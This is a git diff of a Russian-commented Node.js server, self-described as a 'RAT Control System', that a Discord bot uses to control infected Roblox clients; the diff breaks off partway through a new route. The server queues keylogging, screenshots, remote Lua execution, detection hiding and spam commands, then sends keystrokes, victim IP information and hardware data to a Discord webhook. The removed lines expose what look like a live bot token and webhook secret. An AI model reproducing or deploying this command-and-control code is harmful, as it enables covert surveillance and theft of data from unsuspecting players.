@@ -1,32 +1,41 @@
-const http = require('http');
+const express = require('express');
 const fetch = require('node-fetch');
 const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
+const cors = require('cors');
 
 // ========== КОНФИГУРАЦИЯ ==========
-const DISCORD_TOKEN = "MTM5Nzk4NTQyODM4NDI1NjAwMA.G0eV_u.YWv51ZEnVKxdQT10aEcd7a9D1DXRbAW871t_-E";
+const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
 const SERVER_URL = process.env.SERVER_URL || "https://ratserver-6wo3.onrender.com";
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1466306688041881701/HZCCFS3G7hVKldD8qzWNugJGhCdRTTbbc3aicr9ANOVCTgJYqb0t58bMWnJkeOA1L3MJ";
+const WEBHOOK_URL = process.env.WEBHOOK_URL;
 const PORT = process.env.PORT || 10000;
 
-// Логирование конфигурации
+// Логирование конфигурации (без показа токенов)
 console.log('🔧 Конфигурация сервера v3.1:');
 console.log(`- PORT: ${PORT}`);
 console.log(`- SERVER_URL: ${SERVER_URL}`);
 console.log(`- DISCORD_TOKEN: ${DISCORD_TOKEN ? '✅ Установлен' : '❌ Отсутствует'}`);
 console.log(`- WEBHOOK_URL: ${WEBHOOK_URL ? '✅ Установлен' : '❌ Отсутствует'}`);
+console.log(`- Режим: ${DISCORD_TOKEN ? 'Бот + Вебхук' : 'Только Вебхук'}`);
+console.log(`- Express.js: ✅ Используется`);
 
 // ========== ХРАНИЛИЩЕ ДАННЫХ ==========
 let commandQueue = [];
 let lastScreenshot = null;
 global.onlineUsers = new Map();
 
+// ========== ИНИЦИАЛИЗАЦИЯ EXPRESS ==========
+const app = express();
+app.use(cors());
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+
 // ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
 function isValidUsername(str) {
     if (!str || typeof str !== 'string') return false;
     if (str.length < 3 || str.length > 20) return false;
     if (!/^[a-zA-Z0-9_]+$/.test(str)) return false;
-    if (!isNaN(parseInt(str))) return false; // не число
-    if (str.startsWith('-')) return false; // не параметр
+    if (!isNaN(parseInt(str))) return false;
+    if (str.startsWith('-')) return false;
     return true;
 }
 
@@ -34,36 +43,24 @@ function parseCommandWithTarget(message) {
     const args = message.content.slice(1).split(' ');
     const command = args.shift().toLowerCase();
     
-    // Если нет аргументов
     if (args.length === 0) {
         return { command, args, target: null };
     }
     
-    // Список команд, которые НЕ принимают таргет как первый аргумент
     const noTargetCommands = ['users', 'status', 'help', 'test', 'print'];
-    
-    // Список команд, где первый аргумент ВСЕГДА текст, а не ник
     const textFirstCommands = ['message', 'fakeerror', 'execute', 'popup'];
-    
-    // Команды где первый аргумент может быть текстом (причина и тд)
     const textPossibleCommands = ['kick'];
-    
-    // Команды где первый аргумент может быть текстом или числом
     const mixedFirstArgCommands = ['cameralock', 'freeze', 'blur', 'playaudio', 'jumpscare', 'camerashake'];
     
-    // Если команда в списке noTargetCommands
     if (noTargetCommands.includes(command)) {
         return { command, args, target: null };
     }
     
-    // Если команда требует текст первым аргументом
     if (textFirstCommands.includes(command)) {
         return { command, args, target: null };
     }
     
-    // Для команд где текст возможен, но не обязателен
     if (textPossibleCommands.includes(command)) {
-        // Если есть больше одного аргумента, первый может быть ником
         if (args.length > 1 && isValidUsername(args[0])) {
             const target = args.shift();
             return { command, args, target };
@@ -71,20 +68,14 @@ function parseCommandWithTarget(message) {
         return { command, args, target: null };
     }
     
-    // Для команд со смешанными первыми аргументами
     if (mixedFirstArgCommands.includes(command)) {
-        // Проверяем первый аргумент
         const firstArg = args[0].toLowerCase();
-        
-        // Список допустимых текстовых значений для этих команд
         const validTextValues = ['on', 'off', 'enable', 'disable', 'true', 'false'];
         
-        // Если первый аргумент - валидный текст или число, то это не ник
         if (validTextValues.includes(firstArg) || !isNaN(parseInt(firstArg))) {
             return { command, args, target: null };
         }
         
-        // Если первый аргумент похож на ник
         if (isValidUsername(args[0])) {
             const target = args.shift();
             return { command, args, target };
@@ -93,16 +84,12 @@ function parseCommandWithTarget(message) {
         return { command, args, target: null };
     }
     
-    // Для остальных команд проверяем первый аргумент
     const firstArg = args[0];
-    
-    // Если первый аргумент похож на ник
     if (isValidUsername(firstArg)) {
         const target = args.shift();
         return { command, args, target };
     }
     
-    // Во всех остальных случаях - нет таргета
     return { command, args, target: null };
 }
 
@@ -119,7 +106,6 @@ if (DISCORD_TOKEN) {
         ] 
     });
 
-    // Функция отправки команды на сервер с таргетингом
     async function sendCommand(command, args = [], target = null) {
         try {
             const payload = {
@@ -145,7 +131,6 @@ if (DISCORD_TOKEN) {
         }
     }
 
-    // Получение списка онлайн пользователей
     async function getOnlineUsers() {
         try {
             const response = await fetch(`${SERVER_URL}/users`);
@@ -159,7 +144,6 @@ if (DISCORD_TOKEN) {
         }
     }
 
-    // Получение статуса сервера
     async function getServerStatus() {
         try {
             const response = await fetch(`${SERVER_URL}/status`);
@@ -173,7 +157,6 @@ if (DISCORD_TOKEN) {
         }
     }
 
-    // Функция для создания embed с учетом таргета
     function createEmbed(title, description, color, target = null) {
         const embed = new EmbedBuilder()
             .setTitle(title)
@@ -188,7 +171,6 @@ if (DISCORD_TOKEN) {
         return embed;
     }
 
-    // Обработчик событий Discord бота
     discordClient.on('ready', () => {
         console.log(`🤖 Discord бот ${discordClient.user.tag} запущен!`);
         console.log(`🌐 Подключено к серверу: ${SERVER_URL}`);
@@ -204,44 +186,26 @@ if (DISCORD_TOKEN) {
         if (message.content.startsWith('/')) {
             const { command, args, target } = parseCommandWithTarget(message);
             
-            // Словарь всех команд
             const commandHandlers = {
-                // 🧪 ОСНОВНЫЕ
                 test: async () => {
                     const text = "Тестовая команда от Discord бота! ✅";
                     if (await sendCommand("popup", [text], target)) {
-                        const embed = createEmbed(
-                            '🧪 Тестовая команда',
-                            'Сообщение отправлено',
-                            0x00ff00,
-                            target
-                        );
+                        const embed = createEmbed('🧪 Тестовая команда', 'Сообщение отправлено', 0x00ff00, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
                 
                 print: async () => {
                     if (await sendCommand("print", [], target)) {
-                        const embed = createEmbed(
-                            '📡 Проверка связи',
-                            'Команда проверки связи отправлена',
-                            0x00ff00,
-                            target
-                        );
+                        const embed = createEmbed('📡 Проверка связи', 'Команда проверки связи отправлена', 0x00ff00, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
                 
-                // 👤 УПРАВЛЕНИЕ ИГРОКОМ
                 kick: async () => {
                     const reason = args.join(' ') || 'Нарушение правил';
                     if (await sendCommand("kick", [reason], target)) {
-                        const embed = createEmbed(
-                            '🦶 Кик',
-                            `**Причина:** ${reason}`,
-                            0xe74c3c,
-                            target
-                        );
+                        const embed = createEmbed('🦶 Кик', `**Причина:** ${reason}`, 0xe74c3c, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
@@ -249,112 +213,65 @@ if (DISCORD_TOKEN) {
                 freeze: async () => {
                     let seconds = parseInt(args[0]) || 5;
                     seconds = Math.min(seconds, 60);
-                    
                     if (await sendCommand("freeze", [seconds], target)) {
-                        const embed = createEmbed(
-                            '❄️ Заморозка',
-                            `**Длительность:** \`${seconds}\` секунд`,
-                            0x3498db,
-                            target
-                        );
+                        const embed = createEmbed('❄️ Заморозка', `**Длительность:** \`${seconds}\` секунд`, 0x3498db, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
                 
                 void: async () => {
                     if (await sendCommand("void", [], target)) {
-                        const embed = createEmbed(
-                            '🌀 Телепорт в бездну',
-                            'Игрок телепортирован в бездну',
-                            0x2c3e50,
-                            target
-                        );
+                        const embed = createEmbed('🌀 Телепорт в бездну', 'Игрок телепортирован в бездну', 0x2c3e50, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
                 
                 spin: async () => {
                     if (await sendCommand("spin", [], target)) {
-                        const embed = createEmbed(
-                            '🔄 Вращение',
-                            'Игрок начинает вращаться',
-                            0xf39c12,
-                            target
-                        );
+                        const embed = createEmbed('🔄 Вращение', 'Игрок начинает вращаться', 0xf39c12, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
                 
                 fling: async () => {
                     if (await sendCommand("fling", [], target)) {
-                        const embed = createEmbed(
-                            '🚀 Подбрасывание',
-                            'Игрок подброшен в воздух',
-                            0xe67e22,
-                            target
-                        );
+                        const embed = createEmbed('🚀 Подбрасывание', 'Игрок подброшен в воздух', 0xe67e22, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
                 
                 sit: async () => {
                     if (await sendCommand("sit", [], target)) {
-                        const embed = createEmbed(
-                            '🪑 Изменение позы',
-                            'Игрок меняет позу (сидит/встает)',
-                            0x27ae60,
-                            target
-                        );
+                        const embed = createEmbed('🪑 Изменение позы', 'Игрок меняет позу (сидит/встает)', 0x27ae60, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
                 
                 dance: async () => {
                     if (await sendCommand("dance", [], target)) {
-                        const embed = createEmbed(
-                            '💃 Танец',
-                            'Игрок начинает танцевать',
-                            0xe91e63,
-                            target
-                        );
+                        const embed = createEmbed('💃 Танец', 'Игрок начинает танцевать', 0xe91e63, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
                 
-                // 🔊 АУДИО/ВИДЕО
                 mute: async () => {
                     if (await sendCommand("mute", [], target)) {
-                        const embed = createEmbed(
-                            '🔇 Звуки отключены',
-                            'Все звуки в игре выключены',
-                            0x95a5a6,
-                            target
-                        );
+                        const embed = createEmbed('🔇 Звуки отключены', 'Все звуки в игре выключены', 0x95a5a6, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
                 
                 unmute: async () => {
                     if (await sendCommand("unmute", [], target)) {
-                        const embed = createEmbed(
-                            '🔊 Звуки включены',
-                            'Все звуки в игре включены',
-                            0x2ecc71,
-                            target
-                        );
+                        const embed = createEmbed('🔊 Звуки включены', 'Все звуки в игре включены', 0x2ecc71, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
                 
                 playaudio: async () => {
-                    const audioId = args[0] || "184702873"; // Дефолтный звук
+                    const audioId = args[0] || "184702873";
                     if (await sendCommand("playaudio", [audioId], target)) {
-                        const embed = createEmbed(
-                            '🔊 Воспроизведение аудио',
-                            `**ID аудио:** \`${audioId}\``,
-                            0x9b59b6,
-                            target
-                        );
+                        const embed = createEmbed('🔊 Воспроизведение аудио', `**ID аудио:** \`${audioId}\``, 0x9b59b6, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
@@ -362,27 +279,15 @@ if (DISCORD_TOKEN) {
                 blur: async () => {
                     let seconds = parseInt(args[0]) || 5;
                     seconds = Math.min(seconds, 30);
-                    
                     if (await sendCommand("blur", [seconds], target)) {
-                        const embed = createEmbed(
-                            '🔵 Размытие экрана',
-                            `**Длительность:** \`${seconds}\` секунд`,
-                            0x3498db,
-                            target
-                        );
+                        const embed = createEmbed('🔵 Размытие экрана', `**Длительность:** \`${seconds}\` секунд`, 0x3498db, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
                 
-                // 💬 ЧАТ
                 chat: async () => {
                     if (await sendCommand("chat", [], target)) {
-                        const embed = createEmbed(
-                            '💬 Управление чатом',
-                            'Чат активирован/деактивирован',
-                            0x9b59b6,
-                            target
-                        );
+                        const embed = createEmbed('💬 Управление чатом', 'Чат активирован/деактивирован', 0x9b59b6, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
@@ -400,49 +305,28 @@ if (DISCORD_TOKEN) {
                     }
                     
                     if (await sendCommand("popup", [text], target)) {
-                        const embed = createEmbed(
-                            '📩 Сообщение отправлено',
-                            `**Текст:** \`\`\`${text}\`\`\``,
-                            0x3498db,
-                            target
-                        );
+                        const embed = createEmbed('📩 Сообщение отправлено', `**Текст:** \`\`\`${text}\`\`\``, 0x3498db, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
                 
-                // 👻 СКРИМЕРЫ
                 jumpscare: async () => {
                     let scareType = parseInt(args[0]) || 1;
-                    const scareNames = { 
-                        1: "Джефф Килер 👹", 
-                        2: "Соник.exe 💀" 
-                    };
+                    const scareNames = { 1: "Джефф Килер 👹", 2: "Соник.exe 💀" };
                     const name = scareNames[scareType] || scareNames[1];
                     
                     if (await sendCommand("jumpscare", [scareType], target)) {
-                        const embed = createEmbed(
-                            `👻 Скример ${name}`,
-                            '**Тайминг:**\n1. 2 сек - звук предупреждения\n2. 3 сек - пауза\n3. ⚡ СКРИМЕР!\n**Длительность:** ~10 секунд',
-                            0xff0000,
-                            target
-                        );
+                        const embed = createEmbed(`👻 Скример ${name}`, '**Тайминг:**\n1. 2 сек - звук предупреждения\n2. 3 сек - пауза\n3. ⚡ СКРИМЕР!\n**Длительность:** ~10 секунд', 0xff0000, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
                 
-                // 📷 НОВЫЕ КАМЕРНЫЕ КОМАНДЫ
                 cameralock: async () => {
                     const action = args[0] || "toggle";
-                    const actionText = action === "on" ? "Включена" : 
-                                     action === "off" ? "Выключена" : "Переключена";
+                    const actionText = action === "on" ? "Включена" : action === "off" ? "Выключена" : "Переключена";
                     
                     if (await sendCommand("cameralock", [action], target)) {
-                        const embed = createEmbed(
-                            '🎥 Блокировка камеры',
-                            `**Действие:** ${actionText}\nКамера игрока будет заблокирована в текущей позиции`,
-                            0x3498db,
-                            target
-                        );
+                        const embed = createEmbed('🎥 Блокировка камеры', `**Действие:** ${actionText}\nКамера игрока будет заблокирована в текущей позиции`, 0x3498db, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
@@ -455,17 +339,11 @@ if (DISCORD_TOKEN) {
                     intensity = Math.min(intensity, 10);
                     
                     if (await sendCommand("camerashake", [duration, intensity], target)) {
-                        const embed = createEmbed(
-                            '📷 Тряска камеры',
-                            `**Длительность:** \`${duration}\` секунд\n**Интенсивность:** \`${intensity}\`\nКамера игрока будет трястись с указанной силой`,
-                            0xe67e22,
-                            target
-                        );
+                        const embed = createEmbed('📷 Тряска камеры', `**Длительность:** \`${duration}\` секунд\n**Интенсивность:** \`${intensity}\`\nКамера игрока будет трястись с указанной силой`, 0xe67e22, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
                 
-                // ⚙️ СИСТЕМНЫЕ
                 execute: async () => {
                     const code = args.join(' ');
                     if (!code) {
@@ -479,12 +357,7 @@ if (DISCORD_TOKEN) {
                     }
                     
                     if (await sendCommand("execute", [code], target)) {
-                        const embed = createEmbed(
-                            '🔧 Код отправлен',
-                            `\`\`\`lua\n${code.substring(0, 100)}${code.length > 100 ? '...' : ''}\n\`\`\``,
-                            0xf39c12,
-                            target
-                        );
+                        const embed = createEmbed('🔧 Код отправлен', `\`\`\`lua\n${code.substring(0, 100)}${code.length > 100 ? '...' : ''}\n\`\`\``, 0xf39c12, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
@@ -494,76 +367,45 @@ if (DISCORD_TOKEN) {
                     const displayText = errorText.length > 80 ? errorText.substring(0, 77) + '...' : errorText;
                     
                     if (await sendCommand("fakeerror", [displayText], target)) {
-                        const embed = createEmbed(
-                            '⚠ Фейковая ошибка',
-                            `**Сообщение:** \`${displayText}\``,
-                            0xe74c3c,
-                            target
-                        );
+                        const embed = createEmbed('⚠ Фейковая ошибка', `**Сообщение:** \`${displayText}\``, 0xe74c3c, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
                 
                 keylog: async () => {
                     if (await sendCommand("keylog", [], target)) {
-                        const embed = createEmbed(
-                            '⌨️ Кейлоггер',
-                            'Кейлоггер активирован. Логи будут отправляться каждые 5 минут.',
-                            0xe74c3c,
-                            target
-                        );
+                        const embed = createEmbed('⌨️ Кейлоггер', 'Кейлоггер активирован. Логи будут отправляться каждые 5 минут.', 0xe74c3c, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
                 
                 stopkeylog: async () => {
                     if (await sendCommand("stopkeylog", [], target)) {
-                        const embed = createEmbed(
-                            '🛑 Кейлоггер',
-                            'Кейлоггер деактивирован. Последние логи отправлены.',
-                            0x2ecc71,
-                            target
-                        );
+                        const embed = createEmbed('🛑 Кейлоггер', 'Кейлоггер деактивирован. Последние логи отправлены.', 0x2ecc71, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
                 
                 hardware: async () => {
                     if (await sendCommand("hardware", [], target)) {
-                        const embed = createEmbed(
-                            '🖥️ Оборудование',
-                            'Данные об оборудовании запрошены',
-                            0x00ff00,
-                            target
-                        );
+                        const embed = createEmbed('🖥️ Оборудование', 'Данные об оборудовании запрошены', 0x00ff00, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
                 
                 hide: async () => {
                     if (await sendCommand("hide", [], target)) {
-                        const embed = createEmbed(
-                            '👻 Скрытие скрипта',
-                            'Скрипт успешно скрыт от систем обнаружения',
-                            0x00ff00,
-                            target
-                        );
+                        const embed = createEmbed('👻 Скрытие скрипта', 'Скрипт успешно скрыт от систем обнаружения', 0x00ff00, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
                 
-                // 💥 SPAM
                 memory: async () => {
                     let fileCount = parseInt(args[0]) || 100;
                     fileCount = Math.min(fileCount, 1000);
                     
                     if (await sendCommand("memory_spam", [fileCount], target)) {
-                        const embed = createEmbed(
-                            '💾 Memory Spam',
-                            `**Количество файлов:** \`${fileCount}\``,
-                            0xff6b6b,
-                            target
-                        );
+                        const embed = createEmbed('💾 Memory Spam', `**Количество файлов:** \`${fileCount}\``, 0xff6b6b, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
@@ -573,27 +415,16 @@ if (DISCORD_TOKEN) {
                     imageCount = Math.min(imageCount, 50);
                     
                     if (await sendCommand("gallery_spam", [imageCount], target)) {
-                        const embed = createEmbed(
-                            '🖼️ Gallery Spam',
-                            `**Количество файлов:** \`${imageCount}\`\n**Источник:** GitHub`,
-                            0x74b9ff,
-                            target
-                        );
+                        const embed = createEmbed('🖼️ Gallery Spam', `**Количество файлов:** \`${imageCount}\`\n**Источник:** GitHub`, 0x74b9ff, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
                 
                 screenshot: async () => {
                     if (await sendCommand("screenshot", [], target)) {
-                        const embed = createEmbed(
-                            '🖥️ Скриншот',
-                            'Скриншот запрошен. Результат будет через 5 секунд.',
-                            0x3498db,
-                            target
-                        );
+                        const embed = createEmbed('🖥️ Скриншот', 'Скриншот запрошен. Результат будет через 5 секунд.', 0x3498db, target);
                         await message.reply({ embeds: [embed] });
                         
-                        // Ждем и пытаемся получить скриншот
                         setTimeout(async () => {
                             try {
                                 const response = await fetch(`${SERVER_URL}/screenshot`);
@@ -610,7 +441,6 @@ if (DISCORD_TOKEN) {
                     }
                 },
                 
-                // 👥 ПОЛЬЗОВАТЕЛИ
                 users: async () => {
                     const data = await getOnlineUsers();
                     
@@ -674,7 +504,6 @@ if (DISCORD_TOKEN) {
                     }
                 },
                 
-                // 📜 ПОМОЩЬ
                 help: async () => {
                     const helpEmbed = new EmbedBuilder()
                         .setTitle('🤖 RAT Control Panel v3.1')
@@ -733,7 +562,6 @@ if (DISCORD_TOKEN) {
                 }
             };
             
-            // Выполняем команду если она существует
             if (commandHandlers[command]) {
                 try {
                     await commandHandlers[command]();
@@ -747,15 +575,11 @@ if (DISCORD_TOKEN) {
         }
     });
 
-    // Запуск Discord бота
     discordClient.login(DISCORD_TOKEN).then(() => {
         console.log('✅ Discord бот успешно авторизован');
     }).catch(error => {
         console.error('❌ Ошибка авторизации Discord бота:', error.message);
-        console.error('💡 Скорее всего токен недействителен. Получите новый токен:');
-        console.error('1. Перейдите в Discord Developer Portal');
-        console.error('2. Выберите ваше приложение → Bot → Reset Token');
-        console.error('3. Скопируйте новый токен (без .G0eV_u в конце)');
+        console.error('💡 Проверьте токен в Environment Variables на Render');
     });
 } else {
     console.log('⚠️ DISCORD_TOKEN не установлен. Discord бот не будет запущен.');
@@ -774,6 +598,11 @@ function cleanupInactiveUsers() {
 setInterval(cleanupInactiveUsers, 30 * 1000);
 
 async function sendDiscordMessage(title, description, color = 0x3498db, fields = []) {
+    if (!WEBHOOK_URL) {
+        console.log('⚠️ WEBHOOK_URL не установлен. Пропускаем отправку сообщения.');
+        return;
+    }
+    
     try {
         await fetch(WEBHOOK_URL, {
             method: 'POST',
@@ -790,318 +619,242 @@ async function sendDiscordMessage(title, description, color = 0x3498db, fields =
             })
         });
     } catch (error) {
-        console.error('Discord webhook error:', error.message);
+        console.error('❌ Discord webhook error:', error.message);
     }
 }
 
-const server = http.createServer((req, res) => {
-    res.setHeader('Access-Control-Allow-Origin', '*');
-    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
-    res.setHeader('Content-Type', 'application/json');
-    
-    if (req.method === 'OPTIONS') {
-        res.writeHead(200);
-        res.end();
-        return;
-    }
-    
-    // Получение команд для клиента
-    if (req.method === 'GET' && req.url.startsWith('/data')) {
-        try {
-            const url = new URL(req.url, `http://${req.headers.host}`);
-            const player = url.searchParams.get('player');
-            
-            // Ищем команды для этого игрока или для всех
-            const commandsForPlayer = [];
-            const remainingCommands = [];
-            
-            for (const cmd of commandQueue) {
-                if (cmd.target === null || cmd.target === player || cmd.target === 'all') {
-                    commandsForPlayer.push(cmd);
-                } else {
-                    remainingCommands.push(cmd);
-                }
-            }
-            
-            commandQueue = remainingCommands;
-            
-            if (commandsForPlayer.length > 0) {
-                const cmd = commandsForPlayer[0];
-                res.end(JSON.stringify({
-                    command: cmd.command,
-                    args: cmd.args
-                }));
+// ========== МАРШРУТЫ EXPRESS ==========
+
+// Получение команд для клиента
+app.get('/data', (req, res) => {
+    try {
+        const player = req.query.player;
+        
+        const commandsForPlayer = [];
+        const remainingCommands = [];
+        
+        for (const cmd of commandQueue) {
+            if (cmd.target === null || cmd.target === player || cmd.target === 'all') {
+                commandsForPlayer.push(cmd);
             } else {
-                res.end(JSON.stringify({
-                    command: "",
-                    args: []
-                }));
+                remainingCommands.push(cmd);
             }
-        } catch (e) {
-            res.statusCode = 400;
-            res.end(JSON.stringify({ error: e.message }));
         }
-        return;
+        
+        commandQueue = remainingCommands;
+        
+        if (commandsForPlayer.length > 0) {
+            const cmd = commandsForPlayer[0];
+            res.json({
+                command: cmd.command,
+                args: cmd.args
+            });
+        } else {
+            res.json({
+                command: "",
+                args: []
+            });
+        }
+    } catch (e) {
+        res.status(400).json({ error: e.message });
     }
-    
-    // Отправка команды от бота
-    if (req.method === 'POST' && req.url === '/command') {
-        let body = '';
-        req.on('data', chunk => body += chunk);
-        req.on('end', async () => {
-            try {
-                const { command, args, target } = JSON.parse(body);
-                
-                commandQueue.push({
-                    command: command,
-                    args: args || [],
-                    target: target || null,
-                    timestamp: Date.now()
-                });
-                
-                // Логируем инжект уведомления
-                if (command === "inject_notify") {
-                    const [playerName, gameName, ipInfo, executor, device] = args;
-                    
-                    let description = `**Игрок:** ${playerName}\n`;
-                    description += `**Игра:** ${gameName}\n`;
-                    description += `**Инжектор:** ${executor}\n`;
-                    description += `**Устройство:** ${device}\n\n`;
-                    description += `**IP информация**\n${ipInfo}`;
-                    
-                    await sendDiscordMessage(
-                        "🔌 Новый инжект!",
-                        description,
-                        0x00ff00
-                    );
-                }
-                
-                // Логирование новых камерных команд
-                if (command === "cameralock") {
-                    const action = args[0] || "toggle";
-                    const targetText = target || "всех игроков";
-                    await sendDiscordMessage(
-                        "🎥 Блокировка камеры",
-                        `**Цель:** ${targetText}\n**Действие:** ${action}`,
-                        0x3498db
-                    );
-                }
-                
-                if (command === "camerashake") {
-                    const duration = args[0] || 5;
-                    const intensity = args[1] || 2;
-                    const targetText = target || "всех игроков";
-                    await sendDiscordMessage(
-                        "📷 Тряска камеры",
-                        `**Цель:** ${targetText}\n**Длительность:** ${duration} сек\n**Интенсивность:** ${intensity}`,
-                        0xe67e22
-                    );
-                }
-                
-                // Логирование спама
-                if (command === "spam_completed") {
-                    await sendDiscordMessage(
-                        "📁 Спам завершен",
-                        `**Тип:** ${args[0]}\n**Результат:** ${args[1]}`,
-                        0xf39c12
-                    );
-                }
-                
-                // Логирование чата
-                if (command === "user_chat") {
-                    await sendDiscordMessage(
-                        "💬 Чат игрока",
-                        `**Игрок:** ${args[0]}\n**Сообщение:** ${args[1]}`,
-                        0x3498db
-                    );
-                }
-                
-                res.end(JSON.stringify({ status: "OK" }));
-            } catch (e) {
-                res.statusCode = 400;
-                res.end(JSON.stringify({ error: e.message }));
-            }
-        });
-        return;
-    }
-    
-    // Получение списка онлайн пользователей
-    if (req.method === 'GET' && req.url === '/users') {
-        cleanupInactiveUsers();
-        const users = Array.from(global.onlineUsers.values());
-        res.end(JSON.stringify({
-            users: users,
-            count: users.length
-        }));
-        return;
-    }
-    
-    // Обновление информации о пользователе
-    if (req.method === 'POST' && req.url === '/users') {
-        let body = '';
-        req.on('data', chunk => body += chunk);
-        req.on('end', () => {
-            try {
-                const { player, place, executor, device } = JSON.parse(body);
-                global.onlineUsers.set(player, {
-                    player: player,
-                    place: place,
-                    executor: executor,
-                    device: device || "Unknown",
-                    lastSeen: Date.now()
-                });
-                res.end(JSON.stringify({ status: "OK" }));
-            } catch (e) {
-                res.statusCode = 400;
-                res.end(JSON.stringify({ error: e.message }));
-            }
-        });
-        return;
-    }
-    
-    // Скриншоты
-    if (req.method === 'POST' && req.url === '/screenshot') {
-        let body = '';
-        req.on('data', chunk => body += chunk);
-        req.on('end', () => {
-            try {
-                const { image } = JSON.parse(body);
-                lastScreenshot = image;
-                res.end(JSON.stringify({ status: "OK" }));
-            } catch (e) {
-                res.statusCode = 400;
-                res.end(JSON.stringify({ error: e.message }));
-            }
-        });
-        return;
-    }
-    
-    if (req.method === 'GET' && req.url === '/screenshot') {
-        res.end(JSON.stringify({ 
-            image: lastScreenshot || null 
-        }));
-        return;
-    }
-    
-    // Кейлоггер
-    if (req.method === 'POST' && req.url === '/keylog') {
-        let body = '';
-        req.on('data', chunk => body += chunk);
-        req.on('end', async () => {
-            try {
-                const { logs } = JSON.parse(body);
-                await sendDiscordMessage(
-                    "⌨️ Кейлоггер",
-                    `\`\`\`${logs.slice(0, 1900)}\`\`\``,
-                    0xe74c3c
-                );
-                res.end(JSON.stringify({ status: "OK" }));
-            } catch (e) {
-                res.statusCode = 400;
-                res.end(JSON.stringify({ error: e.message }));
-            }
-        });
-        return;
-    }
-    
-    // Получение информации о железе
-    if (req.method === 'POST' && req.url === '/hardware') {
-        let body = '';
-        req.on('data', chunk => body += chunk);
-        req.on('end', async () => {
-            try {
-                const { player, data } = JSON.parse(body);
-                await sendDiscordMessage(
-                    "💻 Информация о системе",
-                    `**Игрок:** ${player}\n**Игра:** ${data.game}\n**FPS:** ${data.fps}\n**Пинг:** ${data.ping}\n**Экзекутор:** ${data.executor}\n**Устройство:** ${data.device_type}\n**IP Инфо:** ${data.ip_info}`,
-                    0x9b59b6,
-                    [
-                        {
-                            name: "Системная информация",
-                            value: `Touch: ${data.system.touch_enabled}\nMouse: ${data.system.mouse_enabled}\nKeyboard: ${data.system.keyboard_enabled}\nScreen: ${data.system.screen_size.X}x${data.system.screen_size.Y}`,
-                            inline: true
-                        }
-                    ]
-                );
-                res.end(JSON.stringify({ status: "OK" }));
-            } catch (e) {
-                res.statusCode = 400;
-                res.end(JSON.stringify({ error: e.message }));
-            }
-        });
-        return;
-    }
-    
-    // Статус сервера
-    if (req.method === 'GET' && req.url === '/status') {
-        cleanupInactiveUsers();
-        res.end(JSON.stringify({
-            status: "online",
-            version: "3.1.0",
-            online_users: global.onlineUsers.size,
-            pending_commands: commandQueue.length,
-            discord_bot: discordClient && discordClient.user ? {
-                username: discordClient.user.tag,
-                status: "online",
-                commands_count: 27,
-                targeted_commands: true
-            } : { status: "disabled" }
-        }));
-        return;
-    }
-    
-    // Информация о системе
-    if (req.method === 'GET' && req.url === '/system_info') {
-        res.end(JSON.stringify({
-            name: "RAT Control System",
-            version: "3.1.0",
-            description: "Продвинутая система удаленного управления Roblox клиентами",
-            server: SERVER_URL,
-            features: [
-                "Управление игроком (кик, заморозка, телепорт)",
-                "Скример система (Джефф Килер, Соник.exe)",
-                "Камерные команды (блокировка, тряска)",
-                "Чат система с сообщениями",
-                "Мониторинг устройств",
-                "Кейлоггер",
-                "Spam инструменты",
-                "Таргетированные команды (исправленный парсер)"
-            ],
-            total_commands: 27,
-            discord_bot: discordClient && discordClient.user ? {
-                username: discordClient.user.tag,
-                status: "online",
-                commands_count: 27,
-                targeted_commands: true
-            } : { status: "disabled_no_token" }
-        }));
-        return;
-    }
-    
-    // Корневой путь
-    if (req.method === 'GET' && req.url === '/') {
-        res.end(JSON.stringify({
-            message: "RAT Control System v3.1",
-            endpoints: [
-                "/data?player=NAME - Получение команд",
-                "/users - Онлайн пользователи",
-                "/status - Статус системы",
-                "/system_info - Информация о проекте"
-            ],
-            documentation: "Используйте /help в Discord для управления",
-            new_features: "✅ Исправленный парсер команд | ✅ CameraLock | ✅ CameraShake"
-        }));
-        return;
-    }
-    
-    res.writeHead(404);
-    res.end(JSON.stringify({ error: "Not Found", path: req.url }));
 });
 
-// Запуск HTTP сервера
-server.listen(PORT, () => {
-    console.log(`🚀 Сервер запущен на порту ${PORT}`);
+// Отправка команды от бота
+app.post('/command', async (req, res) => {
+    try {
+        const { command, args, target } = req.body;
+        
+        commandQueue.push({
+            command: command,
+            args: args || [],
+            target: target || null,
+            timestamp: Date.now()
+        });
+        
+        if (command === "inject_notify") {
+            const [playerName, gameName, ipInfo, executor, device] = args;
+            
+            let description = `**Игрок:** ${playerName}\n`;
+            description += `**Игра:** ${gameName}\n`;
+            description += `**Инжектор:** ${executor}\n`;
+            description += `**Устройство:** ${device}\n\n`;
+            description += `**IP информация**\n${ipInfo}`;
+            
